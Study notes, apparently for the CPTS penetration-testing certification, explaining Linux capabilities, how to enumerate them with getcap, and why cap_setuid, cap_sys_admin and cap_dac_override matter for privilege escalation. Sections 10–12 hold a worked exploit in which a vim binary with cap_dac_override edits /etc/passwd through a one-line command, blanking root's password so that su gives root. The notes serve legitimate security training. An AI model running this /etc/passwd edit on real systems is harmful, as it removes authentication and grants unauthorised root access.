## 1. What Are Linux Capabilities?

Linux **capabilities** allow specific privileges to be granted to **processes** instead of giving the process complete `root` privileges.

They provide more fine-grained privilege control than the traditional Unix user/group model.

### Traditional model

```text
Normal User
    │
    └── Limited privileges

Root
    │
    └── Almost unlimited privileges
```

### Capabilities model

```text
Process
   │
   ├── cap_net_bind_service
   ├── cap_dac_override
   └── cap_sys_admin
```

A process receives **specific privileges**, rather than becoming completely root.

---

# 2. Why Are Capabilities Interesting for PrivEsc?

Capabilities become dangerous when they are:

- unnecessarily assigned
    
- assigned to powerful binaries
    
- assigned to binaries that aren't properly sandboxed
    
- combined with functionality that allows privilege escalation
    

Misconfigured capabilities can allow a low-privileged user to perform actions normally restricted to privileged users.

### CPTS mindset

Don't think:

> "This binary has a capability → instant root."

Think:

```text
Capability found
      ↓
What privilege does it provide?
      ↓
Which binary has it?
      ↓
What can that binary do?
      ↓
Can that functionality be abused?
      ↓
Privilege escalation
```

---

# 3. Setting Capabilities — `setcap`

`setcap` is used to assign capabilities to executables.

Example:

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

This gives `vim.basic` the `cap_net_bind_service` capability.

`cap_net_bind_service` allows a binary to bind to network ports that would normally require elevated privileges.

---

# 4. Important Capabilities

|Capability|Meaning|
|---|---|
|`cap_sys_admin`|Broad administrative privileges|
|`cap_sys_chroot`|Change root directory|
|`cap_sys_ptrace`|Attach/debug other processes|
|`cap_sys_nice`|Modify process priority|
|`cap_sys_time`|Modify system clock|
|`cap_sys_resource`|Modify system resource limits|
|`cap_sys_module`|Load/unload kernel modules|
|`cap_net_bind_service`|Bind to network ports|

### 🚨 Particularly important for CPTS

```text
cap_setuid
cap_setgid
cap_sys_admin
cap_dac_override
```

These can be especially relevant during privilege escalation.

---

# 5. PrivEsc-Relevant Capabilities

### `cap_setuid`

Allows a process to change its effective UID.

```text
cap_setuid
     ↓
Change effective UID
     ↓
Potentially UID 0
     ↓
Root privileges
```

### `cap_setgid`

Allows changing the effective GID.

Potentially:

```text
cap_setgid
     ↓
GID 0
     ↓
Root group privileges
```

### `cap_sys_admin`

Extremely broad administrative capability.

It includes operations such as mounting/unmounting filesystems and modifying system settings.

### `cap_dac_override`

Allows bypassing normal **Discretionary Access Control (DAC)** permission checks for file read/write/execute operations.

This is extremely interesting when assigned to a powerful file-editing or execution binary.

---

# 6. Capability Values

When using `setcap`, you'll encounter different values.

|Value|Meaning|
|---|---|
|`=`|Sets/clears the specified capability|
|`+ep`|Effective + Permitted|
|`+ei`|Effective + Inheritable|
|`+p`|Permitted|

### Important

```text
+ep
 │
 ├── e = Effective
 └── p = Permitted
```

The **effective** capability is available for the process to use.

---

# 7. Enumerating Capabilities

This is the key enumeration command:

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Example output:

```text
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

### What is happening?

```text
find
 │
 ├── /usr/bin
 ├── /usr/sbin
 ├── /usr/local/bin
 └── /usr/local/sbin
        │
        ↓
     getcap
        │
        ↓
 Show capabilities assigned to binaries
```

---

# 8. `getcap`

Check a specific binary:

```bash
getcap /usr/bin/vim.basic
```

Example:

```text
/usr/bin/vim.basic cap_dac_override=eip
```

This means:

```text
vim.basic
   │
   └── cap_dac_override
            │
            ↓
 Can bypass normal DAC checks
```

---

# 9. Capabilities vs SUID

This distinction is important.

### SUID

```text
User executes binary
        ↓
Binary runs with owner's privileges
        ↓
Usually root-owned → root privileges
```

### Capabilities

```text
User executes binary
        ↓
Binary runs normally
        ↓
Specific capability is granted
        ↓
Only that privileged operation is available
```

So:

> **SUID = privilege through file ownership**

> **Capabilities = specific privileges assigned to the executable/process**

---

# 10. Exploitation Example — `cap_dac_override`

The module's example discovers:

```bash
getcap /usr/bin/vim.basic
```

Output:

```text
/usr/bin/vim.basic cap_dac_override=eip
```

Normally, `/etc/passwd` is protected from arbitrary modification.

First inspect it:

```bash
cat /etc/passwd | head -n1
```

Output:

```text
root:x:0:0:root:/root:/bin/bash
```

---

# 11. Why `cap_dac_override` Matters Here

The chain is:

```text
Low-privileged user
        │
        ↓
vim.basic
        │
        └── cap_dac_override
                  │
                  ↓
       Bypass DAC restrictions
                  │
                  ↓
          Modify /etc/passwd
                  │
                  ↓
       Remove root password marker
                  │
                  ↓
          su → root
```

The important vulnerability isn't simply:

```text
vim has capability
```

It's:

```text
vim
 +
cap_dac_override
 +
ability to modify sensitive files
 =
potential privilege escalation
```

---

# 12. Modifying `/etc/passwd`

The module demonstrates:

```bash
/usr/bin/vim.basic /etc/passwd
```

It can also be performed non-interactively:

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

Then:

```bash
cat /etc/passwd | head -n1
```

Result:

```text
root::0:0:root:/root:/bin/bash
```

The `x` from:

```text
root:x:0:0:root:/root:/bin/bash
```

has been removed.

According to the module, this allows:

```bash
su
```

to log in as root without being asked for the password.

---

# 13. Capability PrivEsc Methodology

When doing CPTS enumeration:

```text
1. Enumerate capabilities
        ↓
2. Identify unusual binaries
        ↓
3. Identify dangerous capability
        ↓
4. Understand what the capability permits
        ↓
5. Understand what the binary can do
        ↓
6. Determine whether the combination is exploitable
        ↓
7. Escalate privileges
```

### Commands to remember

```bash
id
```

```bash
getcap <binary>
```

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

---

# 🔥 CPTS Must-Know

### Capabilities

> Fine-grained privileges assigned to processes/executables.

### Enumeration

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### High-value capabilities

```text
cap_setuid
cap_setgid
cap_sys_admin
cap_dac_override
```

### Critical example

```text
vim.basic
    ↓
cap_dac_override
    ↓
Bypass DAC
    ↓
Modify /etc/passwd
    ↓
Root access
```

### Golden rule

**A capability is not automatically a vulnerability.**

Always analyze:

```text
WHO has it?
WHAT binary has it?
WHICH capability?
WHAT does that capability allow?
HOW can the binary use it?
CAN that combination cross a privilege boundary?
```

This is the mindset you need for CPTS.